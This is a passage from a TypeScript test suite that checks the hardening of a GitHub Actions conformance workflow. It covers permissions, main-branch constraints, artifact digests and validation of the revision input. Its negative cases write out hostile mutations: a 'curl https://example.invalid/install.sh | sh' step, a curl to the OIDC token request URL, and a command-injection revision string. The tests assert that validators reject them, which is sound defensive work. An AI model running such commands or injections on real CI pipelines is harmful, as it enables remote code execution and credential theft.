import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, readFileSync } from 'node:fs';
import { dirname, relative, resolve } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import * as ts from 'typescript';
import { describe, expect, test } from 'vitest';

const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const workflowPath = resolve(projectRoot, '.github', 'workflows', 'client-v1-conformance.yml');
const harnessPath = resolve(projectRoot, 'scripts', 'phase1-conformance.mjs');
const windowsSupervisorBuildPath = resolve(
  projectRoot,
  'scripts',
  'phase1-windows-supervisor-build.sh',
);
const windowsSupervisorInstallPath = resolve(
  projectRoot,
  'scripts',
  'phase1-windows-supervisor-install.ps1',
);
const unixProducerCommandPath = resolve(projectRoot, 'scripts', 'unix-producer-command.sh');
const validatorRoot =
  process.env.OPENCOVEN_SDK_VALIDATOR_ROOT ??
  resolve(projectRoot, '..', 'build-conformance-contract');
const validatorAvailable = existsSync(
  resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
);
const matrixPlatformExpression = '${' + '{ matrix.platform }}';
const validatorInputExpression = '${' + '{ inputs.validator_revision }}';
const protectedValidatorExpression = '${' + '{ vars.CLIENT_V1_CONFORMANCE_VALIDATOR_REVISION }}';
const githubRepositoryExpression = '${' + '{ github.repository }}';
const githubShaExpression = '${' + '{ github.sha }}';
const expressionOpening = '${' + '{';
const uploadedSupervisorArtifactIdExpression =
  '${' + "{ steps['upload-supervisor'].outputs['artifact-id'] }}";
const supervisorArtifactIdExpression =
  '${' + "{ needs['windows-supervisor'].outputs.artifact_id }}";
const platformTemplateExpression = '${' + 'platform}';
const downloadArtifactAction = 'actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c';
const attestBuildProvenanceAction =
  'actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8';
const reviewedWindowsPins = {
  OPENCOVEN_WINDOWS_IMAGE_OS: 'win25',
  OPENCOVEN_WINDOWS_IMAGE_VERSION: '20260824.239.3',
  OPENCOVEN_WINDOWS_BUILD: '26100.33296',
  OPENCOVEN_WINDOWS_KERNEL32_VERSION: '10.0.26100.33296',
  OPENCOVEN_WINDOWS_POWERSHELL_VERSION: '7.6.5',
  OPENCOVEN_WINDOWS_POWERSHELL_PATH: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
  OPENCOVEN_WINDOWS_DOTNET_VERSION: '10.0.11',
  OPENCOVEN_WINDOWS_VS_VERSION: '17.14.37614.0',
  OPENCOVEN_WINDOWS_VS_PATH: 'C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise',
  OPENCOVEN_WINDOWS_MSVC_VERSION: '14.44.35207',
  OPENCOVEN_WINDOWS_MSVC_PATH:
    'C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207',
  OPENCOVEN_WINDOWS_CL_PATH:
    'C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207\\bin\\Hostx64\\x64\\cl.exe',
  OPENCOVEN_WINDOWS_LINK_PATH:
    'C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.44.35207\\bin\\Hostx64\\x64\\link.exe',
  OPENCOVEN_WINDOWS_SDK_VERSION: '10.0.26100.0',
  OPENCOVEN_WINDOWS_RC_PATH:
    'C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.26100.0\\x64\\rc.exe',
} as const;
const evidenceRevisionExpression =
  '${' + "{ steps['phase1-revisions'].outputs.evidence_revision }}";

function sha256(bytes: string | Buffer): string {
  return createHash('sha256').update(bytes).digest('hex');
}

function workflowStep(workflow: string, name: string): string {
  const start = workflow.indexOf(`      - name: ${name}`);
  if (start < 0) {
    throw new Error(`missing workflow step: ${name}`);
  }
  const end = workflow.indexOf('\n      - ', start + 1);
  return workflow.slice(start, end < 0 ? workflow.length : end);
}

function embeddedWindowsSupervisorSource(workflow: string): string {
  const startMarker = "          $jobSupervisorSource = @'\n";
  const endMarker = "\n          '@\n";
  const start = workflow.indexOf(startMarker);
  if (start < 0) {
    throw new Error('missing inline Windows Job Object supervisor source');
  }
  const end = workflow.indexOf(endMarker, start + startMarker.length);
  if (end < 0) {
    throw new Error('unterminated inline Windows Job Object supervisor source');
  }
  return `${workflow
    .slice(start + startMarker.length, end)
    .split('\n')
    .map((line) => line.replace(/^ {10}/u, ''))
    .join('\n')}\n`;
}

function workflowRunBody(step: string): string {
  const marker = '        run: |\n';
  const start = step.indexOf(marker);
  if (start < 0) {
    throw new Error('workflow step has no literal run body');
  }
  return step.slice(start + marker.length);
}

function workflowStepEnvironment(step: string): string {
  const start = step.indexOf('        env:\n');
  const end = step.indexOf('        run: |\n');
  if (start < 0 || end < start) {
    throw new Error('workflow step has no environment before its run body');
  }
  return step.slice(start, end);
}

function workflowJob(workflow: string, name: string): string {
  const marker = `  ${name}:\n`;
  const start = workflow.indexOf(marker);
  if (start < 0) {
    throw new Error(`missing workflow job: ${name}`);
  }
  const remainder = workflow.slice(start + marker.length);
  const nextJob = /\n {2}[A-Za-z0-9_-]+:\n/u.exec(remainder);
  const end = nextJob === null ? workflow.length : start + marker.length + nextJob.index;
  return workflow.slice(start, end < 0 ? workflow.length : end);
}

function countOccurrences(value: string, expected: string): number {
  return value.split(expected).length - 1;
}

function staticLocalMjsModuleGraph(entryPath: string): string[] {
  const modules = new Set<string>();
  const pending = [entryPath];

  while (pending.length > 0) {
    const modulePath = pending.pop();
    if (modulePath === undefined || modules.has(modulePath)) {
      continue;
    }
    modules.add(modulePath);

    const absolutePath = resolve(projectRoot, modulePath);
    const sourceFile = ts.createSourceFile(
      modulePath,
      readFileSync(absolutePath, 'utf8'),
      ts.ScriptTarget.Latest,
      true,
      ts.ScriptKind.JS,
    );
    for (const statement of sourceFile.statements) {
      if (
        (!ts.isImportDeclaration(statement) && !ts.isExportDeclaration(statement)) ||
        statement.moduleSpecifier === undefined ||
        !ts.isStringLiteral(statement.moduleSpecifier)
      ) {
        continue;
      }
      const specifier = statement.moduleSpecifier.text;
      if (!specifier.startsWith('.') || !specifier.endsWith('.mjs')) {
        continue;
      }
      const importedPath = relative(
        projectRoot,
        resolve(dirname(absolutePath), specifier),
      ).replaceAll('\\', '/');
      if (!importedPath.startsWith('scripts/')) {
        throw new Error(`static harness import escapes scripts/: ${modulePath} -> ${specifier}`);
      }
      pending.push(importedPath);
    }
  }

  return [...modules].sort();
}

function verifyExactMainRefConstraint(label: string, job: string): void {
  const jobLevelConditions = job.match(/^ {4}if:.*$/gmu) ?? [];
  if (
    jobLevelConditions.length !== 1 ||
    jobLevelConditions[0] !== "    if: github.ref == 'refs/heads/main'"
  ) {
    throw new Error(`${label} job is not constrained to the exact main branch ref`);
  }
}

function verifyHardenedWorkflowGraph(workflow: string): void {
  const windowsSupervisor = workflowJob(workflow, 'windows-supervisor');
  const producer = workflowJob(workflow, 'platform-conformance');
  const validation = workflowJob(workflow, 'validate-conformance-artifacts');
  const attestation = workflowJob(workflow, 'attest-conformance-artifacts');
  const aggregate = workflowJob(workflow, 'aggregate-conformance');

  for (const [label, job] of [
    ['windows supervisor', windowsSupervisor],
    ['producer', producer],
    ['validator', validation],
    ['attestation', attestation],
    ['aggregate', aggregate],
  ] as const) {
    verifyExactMainRefConstraint(label, job);
  }

  for (const [label, job] of [
    ['windows supervisor', windowsSupervisor],
    ['producer', producer],
    ['validator', validation],
  ] as const) {
    if (
      job.includes('id-token: write') ||
      job.includes('attestations: write') ||
      !job.includes('contents: read')
    ) {
      throw new Error(`${label} job has privileged permissions`);
    }
  }
  if (
    !producer.includes(`OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${protectedValidatorExpression}`) ||
    !validation.includes(
      `OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${protectedValidatorExpression}`,
    ) ||
    !attestation.includes(
      `OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${protectedValidatorExpression}`,
    ) ||
    !producer.includes('$validatorRevision -cne $protectedValidatorRevision') ||
    countOccurrences(
      `${validation}\n${attestation}`,
      '"$OPENCOVEN_VALIDATOR_REVISION_INPUT" != "$OPENCOVEN_PROTECTED_VALIDATOR_REVISION"',
    ) !== 2
  ) {
    throw new Error('validator input is not bound to the protected environment variable');
  }
  if (
    !producer.includes(`OPENCOVEN_VALIDATOR_REVISION: ${protectedValidatorExpression}`) ||
    !validation.includes('repository: OpenCoven/sdk') ||
    !validation.includes(`ref: ${protectedValidatorExpression}`) ||
    validation.includes(`ref: ${validatorInputExpression}`)
  ) {
    throw new Error('validator execution does not use the protected environment revision');
  }

  const artifacts = ['darwin-arm64', 'linux-x64', 'win32-x64'];
  if (
    countOccurrences(workflow, 'uses: actions/upload-artifact@') !== 2 ||
    countOccurrences(windowsSupervisor, 'uses: actions/upload-artifact@') !== 1 ||
    !windowsSupervisor.includes('name: phase1-process-supervisor-win32-x64') ||
    !windowsSupervisor.includes(
      'path: tools/phase1-process-supervisor/target/x86_64-pc-windows-gnu/release/phase1-process-supervisor.exe',
    ) ||
    countOccurrences(producer, 'uses: actions/upload-artifact@') !== 1 ||
    !producer.includes(`name: client-v1-conformance-${matrixPlatformExpression}`) ||
    validation.includes('uses: actions/upload-artifact@') ||
    attestation.includes('uses: actions/upload-artifact@')
  ) {
    throw new Error('workflow has an alternate artifact upload path');
  }
  for (const platform of artifacts) {
    const artifactName = `name: client-v1-conformance-${platform}`;
    const recordPath = `.artifacts/client-v1-conformance-${platform}.json`;
    if (
      countOccurrences(validation, artifactName) !== 1 ||
      countOccurrences(attestation, artifactName) !== 1 ||
      !validation.includes(recordPath) ||
      !attestation.includes(recordPath)
    ) {
      throw new Error(`workflow does not freshly download exact ${platform} artifact bytes`);
    }
  }
  if (
    countOccurrences(validation, `uses: ${downloadArtifactAction}`) !== 3 ||
    countOccurrences(validation, 'uses: actions/download-artifact@') !== 3 ||
    !validation.includes('name: Validate exact SDK schema, parser, and scanner') ||
    !validation.includes(
      `parsePlatformEvidence(text, \`${platformTemplateExpression} uploaded artifact\`, schema)`,
    ) ||
    !validation.includes('scanConformanceEvidence(record)') ||
    !validation.includes("createHash('sha256').update(bytes).digest('hex')") ||
    !validation.includes('serializeCanonicalJson(record) !== text') ||
    validation.indexOf('name: Validate exact SDK schema, parser, and scanner') <
      validation.lastIndexOf('\n      - ')
  ) {
    throw new Error('fresh validation is incomplete or followed by mutable execution');
  }
  if (
    countOccurrences(attestation, `uses: ${downloadArtifactAction}`) !== 3 ||
    countOccurrences(attestation, 'uses: actions/download-artifact@') !== 3 ||
    countOccurrences(attestation, `uses: ${attestBuildProvenanceAction}`) !== 3 ||
    countOccurrences(attestation, 'uses: actions/attest-build-provenance@') !== 3 ||
    !attestation.includes('name: Compare freshly downloaded artifact digests') ||
    countOccurrences(attestation, 'sha256sum') !== 3 ||
    /(?:actions\/checkout|actions\/setup-node|pnpm\/action-setup|\bnode\b|\bpnpm\b|\bcargo\b|\brustc?\b|phase1-conformance|github-conformance-evidence)/u.test(
      attestation.replaceAll(/client-v1-conformance/gu, ''),
    )
  ) {
    throw new Error('attestation job executes untrusted content or skips fresh digest comparison');
  }
  if (
    !attestation.includes('id-token: write') ||
    !attestation.includes('attestations: write') ||
    !aggregate.includes('needs: attest-conformance-artifacts')
  ) {
    throw new Error('attestation authority is not isolated before aggregation');
  }
  if (
    countOccurrences(validation, 'name: ${{') > 0 ||
    countOccurrences(attestation, 'name: ${{') > 0 ||
    countOccurrences(validation, 'name: ${{ format(') > 0 ||
    countOccurrences(attestation, 'name: ${{ format(') > 0
  ) {
    throw new Error('downloaded artifact names must be static');
  }
}

async function workflowFixture() {
  const { verifyProtectedWorkflow } = await import(
    pathToFileURL(resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs')).href
  );
  const workflow = readFileSync(workflowPath, 'utf8');
  const harness = readFileSync(harnessPath);
  const producerCommit = 'f'.repeat(40);
  const producer = {
    status: 'compatible',
    repository: 'OpenCoven/chat',
    commit: producerCommit,
    tree: 'e'.repeat(40),
    packageManifest: {
      path: 'package.json',
      size: 1,
      sha256: '1'.repeat(64),
    },
    harness: {
      path: 'scripts/phase1-conformance.mjs',
      version: '2.0.0',
      size: harness.byteLength,
      sha256: sha256(harness),
    },
    command: 'test:phase1-conformance',
    recordSchemaVersion: 2,
    workflow: {
      name: 'client-v1 conformance',
      path: '.github/workflows/client-v1-conformance.yml',
      size: Buffer.byteLength(workflow, 'utf8'),
      sha256: sha256(workflow),
      job: 'platform-conformance',
      jobNameTemplate: 'platform-conformance ({platform})',
      aggregationJob: 'aggregate-conformance',
      aggregationJobName: 'aggregate-conformance',
      aggregationRunnerLabels: ['ubuntu-24.04'],
      environment: 'client-v1-conformance',
      environmentId: '20863036831',
      artifactNameTemplate: 'client-v1-conformance-{platform}',
      recordPathTemplate: '.artifacts/client-v1-conformance-{platform}.json',
      sourceRef: 'refs/heads/main',
      runnerLabels: {
        'darwin-arm64': ['macos-14'],
        'linux-x64': ['ubuntu-24.04'],
        'win32-x64': ['windows-2025'],
      },
      signerWorkflow: 'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
      signerDigest: producerCommit,
      sourceDigest: producerCommit,
      predicateType: 'https://slsa.dev/provenance/v1',
      denySelfHostedRunners: true,
    },
  };
  const toolchain = {
    nodeVersion: 'v24.18.1',
    pnpmVersion: 'pnpm@10.34.0',
    rustVersion: '1.95.0',
    tauriVersion: '2.11.4',
  };

  return { producer, toolchain, verifyProtectedWorkflow, workflow };
}

describe('client-v1 conformance workflow bootstrap', () => {
  test('checks out every reviewed source root and resolves tools safely on every platform', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const unixProducerCommand = readFileSync(unixProducerCommandPath, 'utf8');

    expect(workflow.match(/ {10}fetch-depth: 0/gu)).toHaveLength(2);
    expect(workflow).toContain('scripts/executable-resolution.mjs');
    expect(workflow).toContain('      - id: phase1-revisions');
    expect(workflow).toContain('          path: .phase1-counterparts/sdk');
    expect(workflow).toContain('          path: .phase1-counterparts/sdk-evidence');
    expect(workflow).toContain('          path: .phase1-counterparts/sdk-validator');
    expect(workflow).toContain('          path: .phase1-counterparts/coven-cave');
    expect(workflow).toContain('          path: .phase1-counterparts/coven');
    expect(workflow).toContain(`          ref: ${evidenceRevisionExpression}`);
    expect(workflow).toContain(`          ref: ${validatorInputExpression}`);
    expect(unixProducerCommand).toContain('--chat-root "$OPENCOVEN_UNIX_WORKSPACE"');
    expect(unixProducerCommand).toContain(
      '--sdk-root "$OPENCOVEN_UNIX_WORKSPACE/.phase1-counterparts/sdk"',
    );
    expect(unixProducerCommand).toContain(
      '--sdk-evidence-root "$OPENCOVEN_UNIX_WORKSPACE/.phase1-counterparts/sdk-evidence"',
    );
    expect(unixProducerCommand).toContain(
      '--validator-root "$OPENCOVEN_UNIX_WORKSPACE/.phase1-counterparts/sdk-validator"',
    );
    expect(unixProducerCommand).toContain(
      '--cave-root "$OPENCOVEN_UNIX_WORKSPACE/.phase1-counterparts/coven-cave"',
    );
    expect(unixProducerCommand).toContain(
      '--coven-root "$OPENCOVEN_UNIX_WORKSPACE/.phase1-counterparts/coven"',
    );
    expect(workflow).toContain('function Checkout-ExactRepository');
    expect(workflow).toContain("-Label 'SDK candidate'");
    expect(workflow).toContain("-Label 'SDK validator'");
    expect(workflow).toContain("-Label 'Cave authority'");
    expect(workflow).toContain("-Label 'Coven authority'");
  });

  test('builds and transfers the exact frozen Windows supervisor without a pre-Job action', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const buildScript = readFileSync(windowsSupervisorBuildPath, 'utf8');
    const installScript = readFileSync(windowsSupervisorInstallPath, 'utf8');
    const bootstrap = workflowRunBody(
      workflowStep(workflow, 'Bootstrap supervised Windows conformance'),
    );
    const childEnvironmentStart = bootstrap.indexOf('$childEnvironment = [ordered]@{');
    const childEnvironmentEnd = bootstrap.indexOf('\n            }', childEnvironmentStart);
    const childEnvironment = bootstrap.slice(childEnvironmentStart, childEnvironmentEnd);

    expect(workflow).toContain('  windows-supervisor:');
    expect(workflow).toContain(
      "  windows-supervisor:\n    name: build-windows-supervisor\n    if: github.ref == 'refs/heads/main'",
    );
    expect(workflow).toContain('    runs-on: macos-latest');
    expect(workflow).toContain('    needs: windows-supervisor');
    expect(workflow).toContain('        run: bash scripts/phase1-windows-supervisor-build.sh');
    expect(workflow).toContain('          name: phase1-process-supervisor-win32-x64');
    expect(workflow).toContain(`artifact_id: ${uploadedSupervisorArtifactIdExpression}`);
    expect(workflow).toContain('function Download-WindowsSupervisorArtifact');
    expect(workflow).toContain(
      `OPENCOVEN_WINDOWS_SUPERVISOR_ARTIFACT_ID: ${supervisorArtifactIdExpression}`,
    );
    expect(workflow).toContain('OPENCOVEN_PHASE1_WINDOWS_SUPERVISOR_PATH = $fleetSupervisorPath');
    expect(bootstrap.indexOf('$job = [OpenCoven.WindowsJobSupervisor]::Create')).toBeLessThan(
      bootstrap.indexOf('Download-WindowsSupervisorArtifact `'),
    );
    expect(bootstrap.indexOf('Remove-Item Env:OPENCOVEN_WINDOWS_GITHUB_TOKEN')).toBeLessThan(
      bootstrap.indexOf('$job = [OpenCoven.WindowsJobSupervisor]::Create'),
    );
    expect(childEnvironment).not.toContain('OPENCOVEN_WINDOWS_GITHUB_TOKEN');
    expect(childEnvironment).not.toContain('github.token');
    expect(workflow).not.toContain('      - name: Install frozen Windows supervisor');
    expect(workflow).not.toContain(
      '        run: pwsh -NoProfile -File scripts/phase1-windows-supervisor-install.ps1',
    );
    // biome-ignore lint/suspicious/noTemplateCurlyInString: Verifies the literal shell expansion.
    expect(buildScript).toContain('-H "Authorization: Bearer ${token}"');
    expect(buildScript).not.toContain('Authorization: ******');
    expect(buildScript).toContain('source.manifestSha256');
    expect(buildScript).toContain('source.lockSha256');
    expect(buildScript).toContain('source.configSha256');
    expect(buildScript).toContain('stats.isSymbolicLink()');
    expect(installScript).toContain('[IO.FileAttributes]::ReparsePoint');
    expect(installScript).toContain('OPENCOVEN_PHASE1_WINDOWS_SUPERVISOR_PATH=$destination');
  });
});

describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
  test('is expected to be rejected by the pre-repin SDK workflow validator', async () => {
    const fixture = await workflowFixture();
    expect(fixture.workflow).toContain('      validator_revision:');
    expect(fixture.workflow).toContain('        required: true');
    expect(fixture.workflow).toContain('        type: string');
    expect(fixture.workflow).toContain(
      `          OPENCOVEN_VALIDATOR_REVISION: ${protectedValidatorExpression}`,
    );
    expect(fixture.workflow).toContain(
      `          OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${protectedValidatorExpression}`,
    );
    expect(fixture.workflow).toContain('          fetch-depth: 0');
    expect(fixture.workflow).toContain('scripts/executable-resolution.mjs');
    expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
    expect(() =>
      fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
    ).toThrow(/workflow/u);
  });

  test.each([
    [
      'disabled official upload',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - if: false\n        uses: actions/upload-artifact@',
        ),
    ],
    [
      'missing validator input',
      (workflow: string) =>
        workflow.replace(
          [
            '    inputs:',
            '      validator_revision:',
            '        required: true',
            '        type: string',
            '',
          ].join('\n'),
          '',
        ),
    ],
    [
      'optional validator input',
      (workflow: string) => workflow.replace('        required: true', '        required: false'),
    ],
    [
      'defaulted validator input',
      (workflow: string) =>
        workflow.replace('        type: string', '        type: string\n        default: main'),
    ],
    [
      'direct validator expression in shell',
      (workflow: string) =>
        workflow.replace('"$OPENCOVEN_VALIDATOR_REVISION"', `"${validatorInputExpression}"`),
    ],
    [
      'changed validator environment name',
      (workflow: string) =>
        workflow.replace('OPENCOVEN_VALIDATOR_REVISION:', 'UNREVIEWED_VALIDATOR_REVISION:'),
    ],
    [
      'disabled Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
    ],
    [
      'substituted Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace(
          'node scripts/phase1-linux-secret-service.mjs --install',
          'curl https://example.invalid/install.sh | sh',
        ),
    ],
    [
      'sibling action',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - uses: ./unsafe-local-action\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'OIDC request',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: curl "$ACTIONS_ID_TOKEN_REQUEST_URL"\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'artifact substitution',
      (workflow: string) =>
        workflow.replace(
          `          path: .artifacts/client-v1-conformance-${matrixPlatformExpression}.json`,
          '          path: .artifacts/replacement.json',
        ),
    ],
    [
      'mutation after validation',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: node scripts/rewrite-evidence.mjs\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'dynamic artifact name',
      (workflow: string) =>
        workflow.replace(
          `          name: client-v1-conformance-${matrixPlatformExpression}`,
          '          name: $' + "{{ format('client-v1-conformance-{0}', matrix.platform) }}",
        ),
    ],
    [
      'YAML anchor',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-permissions: &evidence-permissions\n  contents: read\npermissions:\n',
        ),
    ],
    [
      'YAML alias',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-value: &evidence-value read\nx-copy: *evidence-value\npermissions:\n',
        ),
    ],
    [
      'YAML merge key',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-defaults: &defaults\n  contents: read\nx-merged:\n  <<: *defaults\npermissions:\n',
        ),
    ],
    [
      'multiline curl',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: >-\n          curl https://example.invalid\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'multiline gh',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: |-\n          gh attestation verify record.json\n      - uses: actions/upload-artifact@',
        ),
    ],
  ])('rejects %s', async (_label, mutate) => {
    const fixture = await workflowFixture();
    const workflow = mutate(fixture.workflow);
    const producer = {
      ...fixture.producer,
      workflow: {
        ...fixture.producer.workflow,
        size: Buffer.byteLength(workflow, 'utf8'),
        sha256: sha256(workflow),
      },
    };

    expect(() => fixture.verifyProtectedWorkflow(workflow, producer, fixture.toolchain)).toThrow(
      /workflow/u,
    );
  });
});

describe('Chat-local protected Windows conformance workflow', () => {
  test('isolates unprivileged production and exact fresh validation from OIDC attestation', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    expect(() => verifyHardenedWorkflowGraph(workflow)).not.toThrow();
  });

  test.each([
    [
      'OIDC on producer',
      (workflow: string) =>
        workflow.replace(
          '  platform-conformance:\n',
          '  platform-conformance:\n    permissions:\n      id-token: write\n',
        ),
    ],
    [
      'OIDC on validator',
      (workflow: string) =>
        workflow.replace(
          '  validate-conformance-artifacts:\n',
          '  validate-conformance-artifacts:\n    permissions:\n      id-token: write\n',
        ),
    ],
    [
      'validator input not matching protected variable',
      (workflow: string) =>
        workflow.replaceAll(
          `OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${protectedValidatorExpression}`,
          `OPENCOVEN_PROTECTED_VALIDATOR_REVISION: ${validatorInputExpression}`,
        ),
    ],
    [
      'validator execution in attestation',
      (workflow: string) =>
        workflow.replace(
          '      - name: Compare freshly downloaded artifact digests',
          '      - run: node validator/scripts/conformance-contract.mjs\n' +
            '      - name: Compare freshly downloaded artifact digests',
        ),
    ],
    [
      'missing fresh attestation download',
      (workflow: string) =>
        workflow.replace(
          / {6}- uses: actions\/download-artifact@[^\n]+\n {8}with:\n {10}name: client-v1-conformance-darwin-arm64\n {10}path: \.artifacts\n/u,
          '',
        ),
    ],
    [
      'missing fresh validation download',
      (workflow: string) => {
        const validation = workflowJob(workflow, 'validate-conformance-artifacts');
        return workflow.replace(
          validation,
          validation.replace(
            / {6}- uses: actions\/download-artifact@[^\n]+\n {8}with:\n {10}name: client-v1-conformance-linux-x64\n {10}path: \.artifacts\n/u,
            '',
          ),
        );
      },
    ],
    [
      'missing digest comparison',
      (workflow: string) => workflow.replace('sha256sum "$record"', 'printf "%s" "$record"'),
    ],
    [
      'alternate upload',
      (workflow: string) =>
        workflow.replace(
          '  validate-conformance-artifacts:\n',
          '  validate-conformance-artifacts:\n    steps:\n      - uses: actions/upload-artifact@bad\n',
        ),
    ],
    [
      'mutation after validation',
      (workflow: string) =>
        workflow.replace(
          '\n  attest-conformance-artifacts:',
          '\n      - run: node scripts/rewrite-evidence.mjs\n  attest-conformance-artifacts:',
        ),
    ],
    [
      'candidate execution in attestation',
      (workflow: string) =>
        workflow.replace(
          '      - name: Compare freshly downloaded artifact digests',
          '      - run: scripts/phase1-conformance.mjs\n' +
            '      - name: Compare freshly downloaded artifact digests',
        ),
    ],
    [
      'dynamic downloaded artifact name',
      (workflow: string) =>
        workflow.replace(
          'name: client-v1-conformance-darwin-arm64',
          'name: $' + "{{ format('client-v1-conformance-{0}', inputs.platform) }}",
        ),
    ],
    [
      'missing exact main-ref constraint',
      (workflow: string) => workflow.replace("    if: github.ref == 'refs/heads/main'\n", ''),
    ],
    [
      'changed exact main-ref constraint',
      (workflow: string) =>
        workflow.replace(
          "    if: github.ref == 'refs/heads/main'",
          "    if: github.ref == 'refs/heads/feature'",
        ),
    ],
    [
      'ambiguous main-or-other constraint',
      (workflow: string) =>
        workflow.replace(
          "    if: github.ref == 'refs/heads/main'",
          "    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/feature'",
        ),
    ],
    [
      'tag constraint',
      (workflow: string) =>
        workflow.replace(
          "    if: github.ref == 'refs/heads/main'",
          "    if: github.ref == 'refs/tags/main'",
        ),
    ],
  ])('rejects hardened graph negative: %s', (_label, mutate) => {
    const workflow = readFileSync(workflowPath, 'utf8');
    expect(() => verifyHardenedWorkflowGraph(mutate(workflow))).toThrow();
  });

  test('passes validator revision only through step env and validates it before child construction', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const environment = workflowStepEnvironment(bootstrap);
    const runBody = workflowRunBody(bootstrap);

    expect(environment).toContain(
      `OPENCOVEN_VALIDATOR_REVISION_INPUT: ${validatorInputExpression}`,
    );
    expect(environment).toContain(`OPENCOVEN_CHAT_REPOSITORY: ${githubRepositoryExpression}`);
    expect(environment).toContain(`OPENCOVEN_CHAT_SHA: ${githubShaExpression}`);
    expect(runBody).not.toContain(validatorInputExpression);
    expect(runBody).not.toContain(expressionOpening);
    expect(runBody).not.toMatch(/\$\{\{\s*inputs\./u);
    expect(runBody).toMatch(
      /\$validatorRevision = Require-LowercaseGitOid\s+`\s+-Value \$env:OPENCOVEN_VALIDATOR_REVISION_INPUT/u,
    );
    expect(runBody.indexOf('$validatorRevision = Require-LowercaseGitOid')).toBeLessThan(
      runBody.indexOf('$childEnvironment = [ordered]@{'),
    );
    expect(runBody).toContain('OPENCOVEN_VALIDATOR_REVISION = $validatorRevision');
  });

  test.each([
    "'; Write-Host injected; '",
    '$' + '{{ github.token }}',
    '{not-an-oid}',
    'a'.repeat(39),
    'A'.repeat(40),
    `${'a'.repeat(20)}\n${'b'.repeat(20)}`,
    `${'a'.repeat(20)};${'b'.repeat(19)}`,
  ])(
    'the exact workflow validator rejects adversarial revision %j',
    (revision) => {
      const workflow = readFileSync(workflowPath, 'utf8');
      const runBody = workflowRunBody(
        workflowStep(workflow, 'Bootstrap supervised Windows conformance'),
      );
      const functionStart = runBody.indexOf('          function Require-LowercaseGitOid {');
      const functionEnd = runBody.indexOf('\n          }\n', functionStart);
      expect(functionStart).toBeGreaterThanOrEqual(0);
      expect(functionEnd).toBeGreaterThan(functionStart);
      const functionSource = runBody
        .slice(functionStart, functionEnd + '\n          }\n'.length)
        .split('\n')
        .map((line) => line.replace(/^ {10}/u, ''))
        .join('\n');
      expect(() =>
        execFileSync(
          'pwsh',
          [
            '-NoLogo',
            '-NoProfile',
            '-NonInteractive',
            '-Command',
            `${functionSource}\nRequire-LowercaseGitOid -Value $env:TEST_REVISION`,
          ],
          {
            encoding: 'utf8',
            env: { ...process.env, TEST_REVISION: revision },
            stdio: ['ignore', 'pipe', 'pipe'],
          },
        ),
      ).toThrow();
    },
    30_000,
  );

  test('runs one inline supervised Windows production before every action or repository command', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const producer = workflowJob(workflow, 'platform-conformance');
    const stepsStart = producer.indexOf('    steps:\n');
    const bootstrapStart = producer.indexOf(
      '      - name: Bootstrap supervised Windows conformance',
      stepsStart,
    );
    const firstAction = producer.indexOf('      - uses:', stepsStart);

    expect(bootstrapStart).toBe(stepsStart + '    steps:\n'.length);
    expect(bootstrapStart).toBeLessThan(firstAction);
    expect(workflowStep(workflow, 'Bootstrap supervised Windows conformance')).toMatch(
      /if: matrix\.platform == 'win32-x64'[\s\S]*?shell: pwsh[\s\S]*?run: \|/u,
    );
    expect(workflow).not.toContain('workflow_call:');
    expect(workflow).not.toMatch(/uses:\s+(?:\.\/|[^@\s]+\/\.github\/workflows\/)/u);

    for (const name of [
      'Install frozen Linux Secret Service',
      'Prepare trusted Unix supervisor',
      'Run supervised Unix production and handoff',
      'Validate broker-owned Unix platform record',
    ]) {
      expect(workflowStep(workflow, name)).toContain("if: matrix.platform != 'win32-x64'");
    }

